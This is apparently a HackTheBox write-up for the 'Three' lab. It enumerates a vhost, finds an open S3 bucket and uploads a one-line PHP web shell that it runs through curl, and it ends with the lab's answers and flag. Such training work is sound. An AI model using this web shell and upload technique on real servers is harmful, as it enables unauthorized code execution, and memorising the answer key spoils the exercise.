TITLE: Three
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Three.png
---

# Start

1. started by doing an nmap scan of the traget machine 
```
22/tcp open  ssh
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http
|_http-title: The Toppers
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS


```
find2 open port 22 and 80
2. added the http://thetoppers.htb to hosts file as ip of the box
3. used gobuster to find subdomains and made the wordlist using cranch

```
crunch 2 2 0123456789abcdefghijklmnopqrstuvwxyz -o 2chars.txt
gobuster vhost -u http://thetoppers.htb -w 2chars.txt --append-domain --exclude-length 5504
```
4. adding the subdomain + ip of the server to the /etc/hosts
```
echo "10.129.227.248 s3.thetoppers.htb" >> /etc/hosts

```
5. now nmap scan to know what the sub.domain is running

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-server-header: 
|   Apache/2.4.29 (Ubuntu)
|_  hypercorn-h11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
we can recognize s3 as amazon server s3 
6. how to interact with this s3, config is just a dummy text
```bash
➜  three aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [s3]: us-east-1
Default output format [None]: json

# sens we have url we do this 
➜  three aws --endpoint-url http://s3.thetoppers.htb s3 ls 
2026-05-08 12:18:20 thetoppers.htb
➜  three aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-05-08 12:18:20          0 .htaccess
2026-05-08 12:18:20      11952 index.php
```
7. shell
create a shell or edit the index.php to add a shell
```bash
# basic php shell
echo "<?php system($_GET['cmd']) ?>" > shell.php
after that uplaod it to the aws server 

aws --endpoint-url http://s3.thetoppers.htb s3 cp ./shell.php s3://thetoppers.htb/shell.php

```
8. run the shell i prefer to use curl 

```
three curl -i -G http://thetoppers.htb/shell.php  --data-urlencode "cmd=ls -la"
HTTP/1.1 200 OK
Date: Fri, 08 May 2026 13:07:59 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 303
Content-Type: text/html; charset=UTF-8

total 28
drwxr-xr-x 3 root root  4096 May  8 13:03 .
drwxr-xr-x 3 root root  4096 Jul 19  2022 ..
-rw-r--r-- 1 root root     0 Apr 12  2022 .htaccess
drwxr-xr-x 2 root root  4096 Apr 12  2022 images
-rw-r--r-- 1 root root 11988 May  8 13:01 index.php
-rw-r--r-- 1 root root    31 May  8 13:03 shell.php
➜  three curl -i -G http://thetoppers.htb/shell.php  --data-urlencode "cmd=ls ../"
HTTP/1.1 200 OK
Date: Fri, 08 May 2026 13:08:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 14
Content-Type: text/html; charset=UTF-8

flag.txt
html
➜  three curl -i -G http://thetoppers.htb/shell.php  --data-urlencode "cmd=cat ../flag.txt"
HTTP/1.1 200 OK
Date: Fri, 08 May 2026 13:08:14 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 33
Content-Type: text/html; charset=UTF-8

a980d99281a28d638ac68b9bf9453c2b

```

## Tasks

1. How many TCP ports are open?
`
2
`

2. What is the domain of the email address provided in the "Contact" section of the website?
`
thetoppers.htb
`

3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
`
/etc/hosts
`

4. Which sub-domain is discovered during further enumeration?
`
s3.thetoppers.htb
`

5. Which service is running on the discovered sub-domain?
`
Amazon S3
`

6. Which command line utility can be used to interact with the service running on the discovered sub-domain?
`
awscli
`

7. Which command is used to set up the AWS CLI installation?
`
aws configure
`

8. What is the command used by the above utility to list all of the S3 buckets?
`
aws s3 ls
`

9. This server is configured to run files written in what web scripting language?
`
PHP
`

10. Submit root flag
`
a980d99281a28d638ac68b9bf9453c2b
`
